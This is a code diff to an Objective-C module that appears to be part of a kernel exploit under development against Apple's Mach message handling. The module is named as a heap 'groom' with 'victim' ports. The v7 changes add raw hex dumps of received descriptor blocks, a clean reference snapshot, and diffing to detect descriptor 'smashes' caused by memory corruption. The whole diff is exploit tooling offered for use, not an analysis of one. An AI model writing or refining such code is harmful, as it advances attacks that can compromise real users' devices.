@@ -31,7 +31,7 @@
 #import "LabLocalTime.h"
 #import "LabDeviceProfile.h"
 
-#define P099_BUILD @"p099-aneprewire-v6-doorround"
+#define P099_BUILD @"p099-aneprewire-v7-door-diff"
 
 #define P099_INPUT_COUNT 254
 #define P099_OUTPUT_COUNT 1
@@ -291,6 +291,18 @@ static BOOL p099_vmread(uint64_t addr, uint8_t *out, uint32_t n) {
 
 static int g_p099_oolHits;
 
+/* v7: one clean desc-block snapshot (from the first clean door victim
+   recv) — the smashed victims diff against it; alignment self-solves. */
+static uint8_t g_p099_clean_block[0x60];
+static BOOL     g_p099_clean_have = NO;
+
+static void p099_dump_hexline(const uint8_t *b, uint32_t n, uint32_t base,
+                              const char *tag) {
+    NSMutableString *h = [NSMutableString string];
+    for (uint32_t k = 0; k < n; k++) [h appendFormat:@"%02x", b[k]];
+    L(@"[v7] %s +0x%02x..%02x %@", tag, base, base + n - 1, h);
+}
+
 static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
     uint8_t rbuf[0x1400];
     memset(rbuf, 0, sizeof rbuf);
@@ -303,7 +315,22 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
           idx, kr);
         return;
     }
-    if (!(h->msgh_bits & MACH_MSGH_BITS_COMPLEX)) { L(@"[v6] door victim=%u simple", idx); return; }
+    if (!(h->msgh_bits & MACH_MSGH_BITS_COMPLEX)) { L(@"[v7] door victim=%u simple", idx); return; }
+    /* v7: raw dump FIRST — head + first 0x50 desc-block bytes; diff vs clean */
+    p099_dump_hexline(rbuf, 0x20, 0, "raw");
+    p099_dump_hexline(rbuf + 0x20, 0x40, 0x20, "raw");
+    if (!g_p099_clean_have
+        && rbuf[0x26] == 0x11 && rbuf[0x27] == 0x00     /* clean pad-law @+6/+7 of desc0 */
+        && memcmp(rbuf + 0x28, g_p099_clean_block, 8)) {
+        /* first clean-compliant block = the reference */
+        memcpy(g_p099_clean_block, rbuf + 0x20, 0x40);
+        g_p099_clean_have = YES;
+        L(@"[v7] clean desc-block snapshot taken (victim=%u)", idx);
+    }
+    if (g_p099_clean_have) {
+        BOOL differs = (memcmp(rbuf + 0x20, g_p099_clean_block, 0x40) != 0);
+        if (differs) L(@"[v7] *** block DIFFERS from clean (victim=%u) — desc words touched ***", idx);
+    }
     uint32_t cnt = ((mach_msg_body_t *)(rbuf + sizeof(mach_msg_header_t)))->msgh_descriptor_count;
     uint32_t smashes = 0;
     for (uint32_t i = 0; i < cnt && i < P099_PK_N_DESC; i++) {
@@ -311,7 +338,10 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
         uint32_t name, padw; uint16_t dtype, ddisp;
         memcpy(&name, dp + 0, 4); memcpy(&padw, dp + 4, 4);
         memcpy(&dtype, dp + 8, 2); memcpy(&ddisp, dp + 10, 2);
-        BOOL clean = (dtype == 0u && ddisp == 0x11u);
+        /* v7 clean law from the 19:15 reads: bytes @4-7 = 00 00 11 00
+           (pad1:16, disposition=0x11 @6, type=0 @7). 12B stride kept; the
+           raw dumps + the clean diff are the layout's ground truth. */
+        BOOL clean = (ddisp == 0x11u && dtype == 0u && (padw & 0xFFFF0000u) == 0x00110000u);
         if (clean) continue;
         smashes++;
         L(@"[v6] DOOR SMASH victim=%u desc[%u] name=0x%08x pad=0x%08x type=0x%04x disp=0x%04x "
@@ -341,7 +371,7 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
             }
         }
     }
-    if (smashes) L(@"[v6] door verdict victim=%u smashes=%u oolHits=%u", idx, smashes, g_p099_oolHits);
+    if (smashes) L(@"[v7] door verdict victim=%u smashes=%u oolHits=%u", idx, smashes, g_p099_oolHits);
 }
 
 @implementation P099AnePrewireGroom
